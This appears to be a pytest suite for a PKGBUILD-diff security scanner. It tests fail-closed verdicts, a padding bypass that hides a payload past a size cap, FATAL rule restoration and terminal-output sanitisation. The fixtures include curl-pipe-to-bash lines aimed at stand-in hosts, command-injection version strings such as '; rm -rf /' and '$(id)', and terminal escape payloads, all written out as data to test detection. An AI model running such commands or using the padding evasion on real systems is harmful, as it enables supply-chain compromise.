"""The security model, tested.

``scripts/security_gates.py`` is the enforcement surface and CI runs it
whole.  This file runs it too, so a claim in ``docs/security.md`` cannot
break without a local ``pytest`` noticing, and adds the behavioural cases
the gates assert only the shape of.
"""

import io
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import (  # noqa: E402
    enforce_fatal_rules,
    load_config,
    shipped_fatal_rule_ids,
    shipped_rules,
)
from trustsight.coverage import (  # noqa: E402
    DIFF_TRUNCATED,
    INCOMPLETE_SUFFIX,
    LINE_TRUNCATED,
    TREE_NOT_ANALYZED,
    UNRESOLVED_SOURCE,
    describe,
    fail_closed,
    gaps_from,
    oversized_lines,
    qualified_band,
    unresolved_source_lines,
)
from trustsight.safe_text import clean, safe_markup  # noqa: E402
from trustsight.schema import PackageFact, ScoreEntry  # noqa: E402
from trustsight.scoring import (  # noqa: E402
    calculate_score,
    verdict_label,
    verdict_level,
)

HEADER = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n pkgver=1.0\n"


def _render_review(results, renderer):
    """Render *results* through the real console, captured as text."""
    from rich.console import Console

    import trustsight.cli.display as display

    buffer = io.StringIO()
    saved = display._console
    display._console = Console(file=buffer, force_terminal=False, width=200)
    try:
        renderer(results, 1, False, True, True, False)
    finally:
        display._console = saved
    return buffer.getvalue()


# --- the gates themselves -------------------------------------------------


def test_every_security_gate_passes():
    from security_gates import run_gates

    failed = [g.name for g in run_gates() if not g.passed]
    assert failed == [], f"security gates failing: {failed}"


def test_the_doc_and_the_gates_name_the_same_invariants():
    """A guarantee with no check, or a check with no guarantee, is a bug."""
    from security_gates import gate_doc_lists_every_gate, run_gates

    gates = [g for g in run_gates() if g.name != "docs/security.md matches the gates"]
    assert gate_doc_lists_every_gate(gates).passed


# --- coverage: what the run could not see ---------------------------------


def test_unresolved_source_is_a_computed_source_line():
    diff = HEADER + '+_url="$(curl -sIL -o /dev/null -w \'%{url_effective}\' "$_link")"\n'
    assert unresolved_source_lines(diff)


@pytest.mark.parametrize("line", [
    '+source=("https://example.org/demo-$pkgver.tar.gz")',
    '+source_x86_64=("$_base/demo.tar.gz")',
    '+_url="https://example.org/demo.tar.gz"',
    '+# _url="$(curl -s https://example.org/redirect)"',
])
def test_resolvable_or_commented_source_lines_are_not_a_gap(line):
    assert unresolved_source_lines(HEADER + line + "\n") == []


def test_removed_lines_are_not_a_gap():
    """A maintainer deleting a computed source is closing the gap, not opening it."""
    diff = HEADER + '-_url="$(curl -s https://example.org/redirect)"\n'
    assert unresolved_source_lines(diff) == []


@pytest.mark.parametrize("gap", [DIFF_TRUNCATED, TREE_NOT_ANALYZED, UNRESOLVED_SOURCE])
@pytest.mark.parametrize("level", ["Low", "Medium"])
def test_a_gap_forbids_a_clean_verdict(gap, level):
    assert fail_closed(level, [gap], []) == "Inconclusive"


@pytest.mark.parametrize("severity", ["HIGH", "CRITICAL", "FATAL"])
def test_a_strong_finding_keeps_its_band_despite_a_gap(severity):
    """Hiding a confirmed finding behind "inconclusive" would lose the signal."""
    breakdown = [ScoreEntry(rule_id="R001", severity=severity, weight=25)]
    assert fail_closed("Medium", [DIFF_TRUNCATED], breakdown) == "Medium"


def test_a_complete_analysis_is_not_downgraded():
    assert fail_closed("Low", [], []) == "Low"
    assert fail_closed("Critical", [DIFF_TRUNCATED], []) == "Critical"


def test_gaps_are_listed_in_a_stable_order():
    gaps = gaps_from(diff_truncated=True, tree_analyzed=False,
                     unresolved_sources=["_url=$(curl ...)"])
    assert gaps == [DIFF_TRUNCATED, TREE_NOT_ANALYZED, UNRESOLVED_SOURCE]


def test_describe_names_every_gap():
    text = describe([DIFF_TRUNCATED, UNRESOLVED_SOURCE])
    assert "size cap" in text and "computed at build time" in text
    assert describe([]) == ""


def test_coverage_appears_in_the_breakdown_without_scoring():
    from trustsight.schema import NoveltyContext

    score, breakdown, level = calculate_score(
        [], {}, NoveltyContext(), coverage_gaps=[DIFF_TRUNCATED],
    )
    entries = [e for e in breakdown if e.rule_id == "COVERAGE"]
    assert len(entries) == 1
    assert entries[0].weight == 0
    assert score == 0
    assert level == "Inconclusive"


def test_a_fatal_finding_still_caps_at_100_with_a_gap():
    """The gap is recorded, but a FATAL verdict is not softened by it."""
    from trustsight.schema import NoveltyContext

    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection"}]
    score, breakdown, level = calculate_score(
        triggered, {}, NoveltyContext(), coverage_gaps=[DIFF_TRUNCATED],
    )
    assert score == 100 and level == "Critical"
    assert any(e.rule_id == "COVERAGE" for e in breakdown)


def test_a_truncated_diff_cannot_report_low(tmp_path):
    """The padding bypass: pad past the cap, append the payload."""
    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 512}}
    padding = "\n".join(f"+# pad {i}" for i in range(300))
    diff = HEADER + padding + "\n+echo hello\n"

    fact = scan_diff(diff, config=config, package_name="demo")
    assert DIFF_TRUNCATED in fact.coverage_gaps
    assert fact.risk == "Inconclusive"
    assert verdict_level(fact) == "Inconclusive"


def test_verdict_level_prefers_the_stored_band():
    fact = PackageFact(final_score=0, risk="Inconclusive")
    assert verdict_level(fact) == "Inconclusive"
    assert verdict_level(PackageFact(final_score=90)) == "Critical"


# --- the decoy seam: a gap always travels with the band -------------------


@pytest.mark.parametrize("band", ["Low", "Medium", "High", "Critical"])
def test_a_band_is_qualified_when_coverage_is_incomplete(band):
    assert qualified_band(band, [DIFF_TRUNCATED]) == band + INCOMPLETE_SUFFIX
    assert qualified_band(band, []) == band


def test_inconclusive_is_not_qualified():
    """It already says what the suffix would say."""
    assert qualified_band("Inconclusive", [DIFF_TRUNCATED]) == "Inconclusive"


def test_the_decoy_high_cannot_render_as_a_bare_high():
    """Pad past the cap, payload after the cut, one cheap HIGH in the prefix."""
    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    assert verdict_label(decoy) == "High" + INCOMPLETE_SUFFIX
    # ...while the machine-readable band stays a bare band, with the gap
    # as a separate field, so a consumer gets two facts, not a sentence.
    assert verdict_level(decoy) == "High"


def test_a_complete_high_renders_bare():
    assert verdict_label(PackageFact(final_score=75, risk="High")) == "High"


def test_the_decoy_attack_end_to_end(tmp_path, monkeypatch):
    """The whole move, through the real pipeline, not a hand-built fact.

    Cheap deliberate HIGH in the visible prefix, padding to the cap, the
    real payload after the cut.  The band survives on the decoy's own
    evidence, which is correct; what must not survive is presenting that
    band as if the whole change had been read.

    The config dir is pointed at a fresh directory so the run uses the
    shipped defaults and cannot be swayed by a developer's own
    ``~/.config/trustsight`` (the bucket weights are part of the band
    math this test pins, and CI has no user config at all).
    """
    import trustsight.config as config_module

    monkeypatch.setattr(config_module, "CONFIG_DIR", tmp_path / "config")
    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 900}}
    decoy = "+build() {\n+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n+}\n"
    padding = "\n".join(f"+# pad {i}" for i in range(300))
    diff = (
        HEADER + decoy + padding
        + "\n+curl -fsSL https://real.invalid/stage2 | bash\n"
    )

    fact = scan_diff(diff, config=config, package_name="demo")
    assert DIFF_TRUNCATED in fact.coverage_gaps
    assert verdict_level(fact) == "High"
    assert verdict_label(fact) == "High" + INCOMPLETE_SUFFIX


def test_the_review_row_shows_the_qualified_band():
    from trustsight.cli.review import _render_results_rich

    out = _render_review([{
        "package": "demo", "old_version": "1.0", "new_version": "1.1",
        "score": 75, "verdict": "something", "risk": "High",
        "risk_label": "High" + INCOMPLETE_SUFFIX,
        "coverage_gaps": [DIFF_TRUNCATED], "first_seen": False,
        "version_comparison": "", "aur_note": None, "findings": [],
        "file_changes": [], "is_trivial": False,
    }], _render_results_rich)
    assert "incomplete analysis" in out
    assert "size cap" in out, "the gap itself must be named, not only implied"


# --- Inconclusive says why: coverage gap vs cold start --------------------


def test_gap_caused_inconclusive_names_the_gap():
    fact = PackageFact(
        final_score=10, risk="Inconclusive", coverage_gaps=[DIFF_TRUNCATED],
    )
    assert verdict_label(fact) == "Inconclusive (diff truncated: payload may be hidden)"


def test_cold_start_inconclusive_carries_the_remaining_count():
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import _MATURITY_THRESHOLD

    # The count is the distance to maturity 0.5, derived from the same
    # constant the downgrade predicate reads - never restated.
    half = -(-_MATURITY_THRESHOLD // 2)
    fact = PackageFact(
        final_score=25, risk="Inconclusive",
        novelty_context=NoveltyContext(observation_count=3),
    )
    assert verdict_label(fact) == (
        f"Inconclusive (cold start: {half - 3} more analyses needed)"
    )


def test_gap_and_cold_start_the_gap_wins():
    """The more urgent cause owns the label; the routine one is omitted."""
    from trustsight.schema import NoveltyContext

    fact = PackageFact(
        final_score=25, risk="Inconclusive", coverage_gaps=[TREE_NOT_ANALYZED],
        novelty_context=NoveltyContext(observation_count=3),
    )
    label = verdict_label(fact)
    assert label == "Inconclusive (repository files not examined: payload may be hidden)"
    assert "cold start" not in label


def test_every_gap_has_an_urgency_wording():
    from trustsight.coverage import GAPS, GAP_INCONCLUSIVE_REASONS

    assert set(GAP_INCONCLUSIVE_REASONS) == set(GAPS)


def test_an_unknown_gap_falls_back_to_generic_wording():
    """A gap name written by a newer build still surfaces, worded generically."""
    from trustsight.coverage import inconclusive_label

    assert inconclusive_label(["some_future_gap"]) == (
        "Inconclusive (some_future_gap: analysis incomplete)"
    )


def test_multiple_gaps_are_all_named():
    from trustsight.coverage import inconclusive_label

    label = inconclusive_label([DIFF_TRUNCATED, UNRESOLVED_SOURCE])
    assert label == (
        "Inconclusive (diff truncated: payload may be hidden; "
        "source computed at build time: fetch destination unknown)"
    )


def test_a_gap_qualified_high_is_unchanged():
    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    assert verdict_label(decoy) == "High" + INCOMPLETE_SUFFIX


def test_cold_start_inconclusive_end_to_end():
    """Through calculate_score, not a hand-built band."""
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import _MATURITY_THRESHOLD

    half = -(-_MATURITY_THRESHOLD // 2)
    weak = [{"rule_id": "R050", "severity": "MEDIUM", "name": "w", "match": ""}] * 2
    novelty = NoveltyContext(observation_count=half - 1)
    score, _breakdown, level = calculate_score(weak, {}, novelty)
    assert level == "Inconclusive"
    fact = PackageFact(final_score=score, risk=level, novelty_context=novelty)
    assert verdict_label(fact) == "Inconclusive (cold start: 1 more analyses needed)"


def test_the_json_report_keeps_the_bare_band_and_carries_the_label():
    """risk stays a bare band; the qualified string rides risk_label."""
    from trustsight.cli.display import _fact_to_dict
    from trustsight.schema import NoveltyContext

    gapped = _fact_to_dict(PackageFact(
        package_name="demo", final_score=10, risk="Inconclusive",
        coverage_gaps=[DIFF_TRUNCATED],
    ))
    assert gapped["risk"] == "Inconclusive"
    assert gapped["risk_label"] == "Inconclusive (diff truncated: payload may be hidden)"
    assert gapped["coverage_gaps"] == [DIFF_TRUNCATED]

    cold = _fact_to_dict(PackageFact(
        package_name="demo", final_score=25, risk="Inconclusive",
        novelty_context=NoveltyContext(observation_count=3),
    ))
    assert cold["risk"] == "Inconclusive"
    assert cold["risk_label"].startswith("Inconclusive (cold start: ")
    assert cold["coverage_gaps"] == []


def test_the_review_row_shows_the_inconclusive_cause():
    from trustsight.cli.review import _render_results_rich

    out = _render_review([{
        "package": "demo", "old_version": "1.0", "new_version": "1.1",
        "score": 10, "verdict": "something", "risk": "Inconclusive",
        "risk_label": "Inconclusive (diff truncated: payload may be hidden)",
        "coverage_gaps": [DIFF_TRUNCATED], "first_seen": False,
        "version_comparison": "", "aur_note": None, "findings": [],
        "file_changes": [], "is_trivial": False,
    }], _render_results_rich)
    assert "payload may be hidden" in out


def test_stored_rows_differentiate_the_inconclusive_cause():
    """history/list read fact_json: gaps name the gap, cold start says so."""
    import json

    from trustsight.scoring import stored_band

    row = {"final_score": 10, "fact_json": json.dumps(
        {"risk": "Inconclusive", "coverage_gaps": [DIFF_TRUNCATED]})}
    label, complete = stored_band(row)
    assert label == "Inconclusive (diff truncated: payload may be hidden)"
    assert complete is False

    # The observation count is not in the stored row, so the cold-start
    # case is named without the remaining-analyses count.
    cold_row = {"final_score": 25, "fact_json": json.dumps(
        {"risk": "Inconclusive", "coverage_gaps": []})}
    assert stored_band(cold_row) == ("Inconclusive (cold start)", True)


# --- the line clamp is a declared gap, not a silent skip ------------------


def test_an_over_long_line_is_recorded_as_a_gap():
    from trustsight.rules import MAX_RULE_LINE_BYTES

    payload = "+_x=1; " + "a" * MAX_RULE_LINE_BYTES + "; curl https://evil.invalid | bash"
    diff = HEADER + payload + "\n"
    fact = scan_diff(diff, package_name="demo")
    assert LINE_TRUNCATED in fact.coverage_gaps
    assert fact.risk == "Inconclusive" or verdict_label(fact).endswith(INCOMPLETE_SUFFIX)


def test_an_ordinary_line_is_not_a_gap():
    fact = scan_diff(HEADER + "+echo hello\n", package_name="demo")
    assert LINE_TRUNCATED not in fact.coverage_gaps


def test_oversized_lines_counts_logical_lines():
    from trustsight.rules import MAX_RULE_LINE_BYTES

    assert oversized_lines(["short", "a" * (MAX_RULE_LINE_BYTES + 1)]) == 1
    assert oversized_lines(["short"]) == 0


# --- expansion bounds -----------------------------------------------------


@pytest.mark.parametrize("body", ["${!name}", "${#name}"])
def test_indirect_and_length_expansion_are_refused(body):
    from trustsight.tokenizer import resolve_expansions

    text, fully = resolve_expansions(body, {"name": "target", "target": "curl evil"})
    assert not fully
    assert "curl" not in text


def test_the_doubling_chain_is_bounded_and_not_silently_truncated():
    from trustsight.tokenizer import _MAX_LINE_LEN, tokenize_and_resolve

    lines = ["+a=" + "z" * 64]
    for i in range(1, 24):
        prev = "a" if i == 1 else f"v{i - 1}"
        lines.append(f"+v{i}=${prev}${prev}")
    diff = HEADER + "\n".join(lines) + "\n"

    resolved, _unresolved = tokenize_and_resolve(diff)
    assert all(len(s) <= _MAX_LINE_LEN for s in resolved)


def test_the_dead_depth_constant_is_gone():
    """A declared bound nothing applies reads like a guarantee."""
    import trustsight.tokenizer as tokenizer

    assert not hasattr(tokenizer, "_MAX_EXPANSION_DEPTH")


# --- rendering is data-driven ---------------------------------------------


def test_a_field_value_cannot_change_the_expansion():
    from trustsight.verdict import _render

    hostile = "{0.__class__} {package_name} {{nested}}"
    entry = ScoreEntry(rule_id="R001", template="{match}", evidence={"match": hostile})
    out = _render(entry, PackageFact(package_name="demo"))
    assert hostile in out, "the value was re-expanded rather than substituted"


def test_a_missing_template_field_falls_back_instead_of_raising():
    from trustsight.verdict import _render

    entry = ScoreEntry(rule_id="R001", reason="fallback text", template="{absent}")
    assert "fallback text" in _render(entry, PackageFact())


def test_nothing_in_the_rendering_path_reaches_the_network():
    import trustsight.findings as findings
    import trustsight.verdict as verdict

    for module in (verdict, findings):
        text = Path(module.__file__).read_text().lower()
        for banned in ("openai", "anthropic", "urllib.request", "httpx", "requests"):
            assert banned not in text


# --- vercmp shape check ---------------------------------------------------


@pytest.mark.parametrize("hostile", ["-h", "--help", "-1:2.0", "; rm -rf /", "", "-",
                                     "1.0 --flag", "$(id)", "1.0\n-h"])
def test_a_non_version_never_reaches_a_command_line(hostile):
    from trustsight.discovery import _VERSION_ARG_RE

    assert not _VERSION_ARG_RE.match(hostile)


@pytest.mark.parametrize("version", ["1.0", "1:1.1.1w-1", "2.0.0.r15.g0a1b2c3-1",
                                     "1.0_beta+2~rc1", "20240101-2"])
def test_a_real_version_passes_the_shape_check(version):
    from trustsight.discovery import _VERSION_ARG_RE

    assert _VERSION_ARG_RE.match(version)


# --- the baseline bound ---------------------------------------------------


def test_doc_cross_references_resolve():
    from security_gates import gate_doc_cross_references_resolve

    gate = gate_doc_cross_references_resolve()
    assert gate.passed, gate.measured


def test_a_renamed_heading_is_caught(tmp_path, monkeypatch):
    """The failure this gate exists for: rename a heading, break the links.

    Every sentence on the page stays true and nothing else fails, which
    is the documentation-level form of skipping content without
    recording a gap.
    """
    import security_gates

    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "a.md").write_text("# A\n\nSee [B](b.md#the-old-name).\n")
    (docs / "b.md").write_text("# B\n\n## The new name\n")
    monkeypatch.setattr(security_gates, "ROOT", tmp_path)

    gate = security_gates.gate_doc_cross_references_resolve()
    assert not gate.passed
    assert any("no such anchor" in problem for problem in gate.measured)


def test_a_regex_in_inline_code_is_not_a_link(tmp_path, monkeypatch):
    """`(?<![^\x00-\x7F])[...]` contains `](...)` and is not markup."""
    import security_gates

    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "a.md").write_text(
        "# A\n\n- **Pattern:** `(?<![^\\x00-\\x7F])[\\u200B](?![^\\x00-\\x7F])`\n"
    )
    monkeypatch.setattr(security_gates, "ROOT", tmp_path)
    assert security_gates.gate_doc_cross_references_resolve().passed


def test_a_baseline_cannot_supply_rules_or_weights():
    from security_gates import gate_a_baseline_supplies_state_not_rules

    gate = gate_a_baseline_supplies_state_not_rules()
    assert gate.passed, gate.measured


# --- FATAL integrity ------------------------------------------------------


def test_the_protected_set_is_derived_not_hardcoded():
    assert set(shipped_fatal_rule_ids()) == {"R012", "R013"}


@pytest.mark.parametrize("rid", ["R012", "R013"])
def test_a_deleted_fatal_rule_is_restored(rid):
    effective, restored = enforce_fatal_rules(
        [r for r in shipped_rules() if r["id"] != rid]
    )
    assert restored == [rid]
    assert any(r["id"] == rid and r["severity"] == "FATAL" for r in effective)


@pytest.mark.parametrize("rid", ["R012", "R013"])
def test_a_downgraded_fatal_rule_is_restored(rid):
    tampered = [
        dict(r, severity="INFO") if r["id"] == rid else r for r in shipped_rules()
    ]
    effective, restored = enforce_fatal_rules(tampered)
    assert restored == [rid]
    assert all(r["severity"] == "FATAL" for r in effective if r["id"] == rid)


def test_an_untouched_ruleset_is_left_alone():
    effective, restored = enforce_fatal_rules(shipped_rules())
    assert restored == []
    assert len(effective) == len(shipped_rules())


def test_a_user_added_rule_survives_enforcement():
    """Restoring a FATAL rule must not drop anything the operator added."""
    custom = {"id": "X999", "name": "local", "pattern": "zzz",
              "severity": "LOW", "category": "custom"}
    effective, _ = enforce_fatal_rules(
        [r for r in shipped_rules() if r["id"] != "R012"] + [custom]
    )
    assert any(r["id"] == "X999" for r in effective)


# --- output sanitisation --------------------------------------------------


@pytest.mark.parametrize("hostile", [
    "\x1b[2J\x1b[H",                  # clear screen, home cursor
    "\x1b]8;;http://evil.invalid\x07",  # OSC hyperlink
    "\x9b31m",                        # 8-bit CSI
    "demo\x00\x07\x7f",               # bare control bytes
    "line\nbreak\ttab",               # layout characters
])
def test_clean_removes_everything_a_terminal_acts_on(hostile):
    out = clean(hostile)
    assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]", out)
    assert "\x1b" not in out


def test_clean_leaves_ordinary_text_alone():
    for ordinary in ("python-requests", "1.2.3-1", "usr/lib/systemd/system/x.service",
                     "Jörg Müller <j@example.org>"):
        assert clean(ordinary) == ordinary


def test_clean_truncates_on_request():
    assert clean("a" * 100, limit=10) == "a" * 9 + "…"


def test_safe_markup_neutralises_rich_tags():
    assert safe_markup("[bold red]CLEAN[/]") == r"\[bold red]CLEAN\[/]"


def test_an_unbalanced_tag_does_not_abort_the_render():
    """A MarkupError used to kill the render of every later package."""
    from rich.console import Console
    from rich.table import Table

    buffer = io.StringIO()
    console = Console(file=buffer, force_terminal=False, width=120)
    table = Table(show_header=False)
    table.add_column()
    table.add_row(safe_markup("[/not-a-tag"))
    console.print(table)
    assert "not-a-tag" in buffer.getvalue()


def test_a_hostile_package_cannot_repaint_the_review_table():
    from rich.console import Console

    import trustsight.cli.display as display
    import trustsight.cli.review as review

    hostile = "\x1b[2J[green]VERDICT: CLEAN[/]"
    results = [{
        "package": hostile, "old_version": "1.0", "new_version": "1.1",
        "score": 75, "verdict": hostile, "risk": "High", "first_seen": False,
        "coverage_gaps": [], "version_comparison": "", "aur_note": None,
        "findings": [{"rule_id": hostile, "file": hostile, "line": 1,
                      "description": hostile, "template": "", "evidence": {},
                      "severity": "HIGH", "weight": 25}],
        "file_changes": [{"path": hostile, "status": "added"}],
        "is_trivial": False,
    }]

    buffer = io.StringIO()
    saved = display._console
    display._console = Console(file=buffer, force_terminal=False, width=200)
    try:
        review._render_results_rich(results, 1, False, True, True, False)
    finally:
        display._console = saved

    out = buffer.getvalue()
    assert "\x1b" not in out
    assert "[green]" in out, "markup was interpreted rather than printed"


# --- the seed is not a control channel ------------------------------------


def test_a_seed_cannot_rewrite_the_database():
    from security_gates import gate_seed_cannot_rewrite_the_database

    gate = gate_seed_cannot_rewrite_the_database()
    assert gate.passed, gate.measured


# --- bounded work on hostile input ----------------------------------------


def test_rule_matching_clamps_its_input():
    from trustsight.rules import MAX_RULE_LINE_BYTES, clamp

    assert len(clamp("a" * (MAX_RULE_LINE_BYTES * 2))) == MAX_RULE_LINE_BYTES
    assert clamp("short") == "short"


def test_config_lists_are_data_not_patterns():
    """A host or port list entry with a metacharacter must not become regex."""
    from trustsight.config import _free_registrar_tld_pattern, _standard_port_pattern

    re.compile(_standard_port_pattern())
    re.compile(_free_registrar_tld_pattern())


def test_the_metadata_fetch_is_bounded():
    from trustsight.full_aur import metadata

    assert metadata.HTTP_TIMEOUT > 0
    assert metadata.MAX_RESPONSE_BYTES > 0
    assert metadata.MAX_DECOMPRESSED_BYTES > 0


# --- the memos must stay correct, not just fast ----------------------------


def test_memoised_lines_are_not_shared_between_callers():
    """Twenty call sites hold the result; one must not edit another's."""
    from trustsight.tokenizer import resolve_added_lines

    diff = HEADER + "+C=curl\n+$C https://x.invalid/s.sh | bash\n"
    first = resolve_added_lines(diff)
    first.append("INJECTED")
    first[0] = "CLOBBERED"
    second = resolve_added_lines(diff)
    assert "INJECTED" not in second
    assert second[0] != "CLOBBERED"


def test_memoised_classification_is_not_shared():
    from trustsight.rules import _classify_enclosing_function

    lines = ["+build() {", "+  curl x | bash", "+}"]
    first = _classify_enclosing_function(lines)
    first[999] = "INJECTED"
    assert 999 not in _classify_enclosing_function(lines)


def test_the_memo_distinguishes_different_diffs():
    """A two-entry cache must not answer for the wrong diff."""
    from trustsight.tokenizer import resolve_added_lines

    a = HEADER + "+A=wget\n+$A http://a.invalid\n"
    b = HEADER + "+A=curl\n+$A http://b.invalid\n"
    for _ in range(3):
        assert any("wget http://a.invalid" in ln for ln in resolve_added_lines(a))
        assert any("curl http://b.invalid" in ln for ln in resolve_added_lines(b))


def test_memoisation_is_per_thread():
    """A shared cache would hand one package's lines to another."""
    import threading

    from trustsight.tokenizer import resolve_added_lines

    results = {}

    def work(tag, marker):
        diff = HEADER + f"+X={marker}\n+$X run\n"
        for _ in range(20):
            got = resolve_added_lines(diff)
            results.setdefault(tag, set()).update(
                ln for ln in got if "run" in ln
            )

    threads = [threading.Thread(target=work, args=(i, f"m{i}")) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    for tag, lines in results.items():
        assert lines == {f"+m{tag} run"}, f"thread {tag} saw {lines}"


def test_read_only_config_accessors_are_not_mutated():
    """load_toml(copy_result=False) is safe only while this holds."""
    import trustsight.config as config

    for accessor in (config.load_patterns, config.load_hosts, config.load_naming,
                     config.load_thresholds, config.load_iocs, config.load_domains):
        before = accessor()
        snapshot = repr(before)
        # A full analysis must leave every shared table exactly as it was.
        scan_diff(HEADER + "+curl https://x.invalid/s.sh | bash\n", package_name="p")
        assert repr(accessor()) == snapshot, f"{accessor.__name__} was mutated"


# --- defects found by audit, pinned so they cannot return -----------------


def test_dependency_changes_reach_the_change_summary():
    """B7's dependency row was dead twice over.

    `fact.dependency_changes` was never populated, and `summarise` read a
    `{op: names}` shape that `extract_dependency_changes` does not return
    (it returns `{field: {added names}}`). Adding a dependency produced no
    change entry at all.
    """
    diff = HEADER + "+depends=('qt6-svg' 'glibc')\n"
    fact = scan_diff(diff, package_name="demo")
    assert fact.dependency_changes, "dependency_changes was not populated"
    assert any(c.startswith("depends: ") for c in fact.changes), fact.changes
    entry = next(c for c in fact.changes if c.startswith("depends: "))
    assert "+qt6-svg" in entry and "+glibc" in entry


def test_declared_default_is_actually_used():
    """B10 promised a default subset with the rest under --verbose.

    `DECLARED_DEFAULT` existed and was referenced by nothing, so every
    declared practice rendered every time and the documented behaviour did
    not exist.
    """
    import inspect as _inspect

    import trustsight.cli.inspect as inspect_cli
    from trustsight.scoring import DECLARED_DEFAULT

    assert DECLARED_DEFAULT
    source = _inspect.getsource(inspect_cli)
    assert "DECLARED_DEFAULT" in source, "the default subset is never applied"


def test_the_declared_group_honours_verbose():
    from rich.console import Console

    import trustsight.cli.display as display
    import trustsight.cli.inspect as inspect_cli

    diff = HEADER + (
        '+source=("https://github.com/d/d/archive/v1.tar.gz")\n'
        "+sha256sums=('3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8')\n"
    )
    fact = scan_diff(diff, package_name="demo")

    def render(verbose):
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=110)
        try:
            inspect_cli._inspect_rich(fact, verbose=verbose)
        finally:
            display._console = saved
        return buffer.getvalue()

    terse, full = render(False), render(True)
    assert "more declared practice(s)" in terse
    assert "more declared practice(s)" not in full
    # The suppressed ones really are absent, not merely uncounted.
    assert "checksums declared" not in terse
    assert "checksums declared" in full


def test_stored_rows_do_not_show_a_bare_band_for_an_incomplete_run():
    """B2 on the history and list surfaces.

    Both re-derived the band from the saved score with `risk_level`, which
    cannot express Inconclusive and knows nothing about coverage, so a run
    reported incomplete by `review` displayed a bare band afterwards.
    """
    import json

    from trustsight.coverage import DIFF_TRUNCATED, INCOMPLETE_SUFFIX
    from trustsight.scoring import stored_band

    row = {"final_score": 40, "fact_json": json.dumps(
        {"risk": "High", "coverage_gaps": [DIFF_TRUNCATED]})}
    label, complete = stored_band(row)
    assert label == "High" + INCOMPLETE_SUFFIX
    assert complete is False

    clean_row = {"final_score": 10, "fact_json": json.dumps(
        {"risk": "Low", "coverage_gaps": []})}
    assert stored_band(clean_row) == ("Low", True)

    # A row written before the field existed falls back honestly.
    assert stored_band({"final_score": 60})[0] == "High"


# --- B1 fingerprint / A14 / B9 structural ---------------------------------


def test_the_fingerprint_moves_only_with_the_instrument():
    import trustsight.config as config_module
    from trustsight.config import config_fingerprint

    first = config_fingerprint()
    assert first.startswith("sha256:")
    assert config_fingerprint() == first, "fingerprint is not stable"

    saved = config_module.load_thresholds
    config_module.load_thresholds = lambda: {"thresholds": {"probe": 1}}
    try:
        assert config_fingerprint() != first
    finally:
        config_module.load_thresholds = saved
    assert config_fingerprint() == first, "fingerprint did not return"


def test_the_report_carries_the_fingerprint():
    from trustsight.config import config_fingerprint
    from trustsight.schema import fact_to_dict

    fact = scan_diff(HEADER + "+pkgver=2\n", package_name="demo")
    assert fact_to_dict(fact)["config_fingerprint"] == config_fingerprint()


def test_inspect_json_carries_the_fingerprint_too():
    """B1 says *every* machine-readable report, not the ones that happened to.

    `inspect --json` goes through display._fact_to_dict, which omitted the
    fingerprint while review --json and fact_to_dict carried it, so the
    guarantee was true of two paths out of three.
    """
    from trustsight.cli.display import _fact_to_dict
    from trustsight.config import config_fingerprint

    fact = scan_diff(HEADER + "+pkgver=2\n", package_name="demo")
    assert _fact_to_dict(fact)["config_fingerprint"] == config_fingerprint()


def test_a_suppression_survives_the_default_json(tmp_path, monkeypatch):
    """B5: no flag may hide a suppression.

    `suppressed_rules` rode along only under --verbose, so the default
    `review --json` made a switched-off rule indistinguishable from one that
    never matched.
    """
    import ast
    from pathlib import Path

    src = Path(__file__).resolve().parent.parent / "src" / "trustsight" / "cli" / "review.py"
    tree = ast.parse(src.read_text())
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        test = ast.unparse(node.test)
        if "verbose" not in test and "quiet" not in test:
            continue
        for inner in ast.walk(node):
            assert not (isinstance(inner, ast.Constant)
                        and inner.value == "suppressed_rules"), (
                f"suppressed_rules is emitted under `if {test}` "
                f"at cli/review.py:{inner.lineno}"
            )


def test_the_shipped_baseline_key_is_pinned_and_valid():
    """A13: a real ed25519 distribution key is pinned (v0.12.0), so signed
    baseline import works.  The shipped file is 32 raw key bytes, not the old
    placeholder, and it loads without raising."""
    from trustsight.full_aur.export import (
        InvalidSignatureError,
        NoTrustedKeyError,
        _load_trusted_pubkey,
        _TRUSTED_PUBKEY_FILE,
    )

    # The two error types stay distinct: "no key pinned" must never be reported
    # as "your artifact is forged".
    assert not issubclass(NoTrustedKeyError, InvalidSignatureError)

    key = _load_trusted_pubkey(_TRUSTED_PUBKEY_FILE)
    assert len(key) == 32


def test_a_non_key_file_is_reported_as_no_pinned_key(tmp_path):
    """The placeholder detection is about length: a build that pins a non-key
    file refuses with NoTrustedKeyError rather than the forged-signature error
    that would accuse a good artifact."""
    import pytest as _pytest

    from trustsight.full_aur.export import NoTrustedKeyError, _load_trusted_pubkey

    not_a_key = tmp_path / "baseline_pubkey.pem"
    not_a_key.write_text("# instructions, not key bytes\n")
    with _pytest.raises(NoTrustedKeyError, match="No distribution key is pinned"):
        _load_trusted_pubkey(not_a_key)


def test_a_real_key_length_is_accepted(tmp_path):
    """The refusal is about length, so a genuine 32-byte key must pass it."""
    from trustsight.full_aur.export import _load_trusted_pubkey

    key = tmp_path / "pub.pem"
    key.write_bytes(b"\x01" * 32)
    assert _load_trusted_pubkey(key) == b"\x01" * 32


@pytest.mark.parametrize("case", [
    "first-seen", "first-seen-versions", "nothing-fired", "signals", "fatal",
])
def test_every_verdict_ends_with_a_direction(case):
    """B9 structurally: something present, not a phrasing absent."""
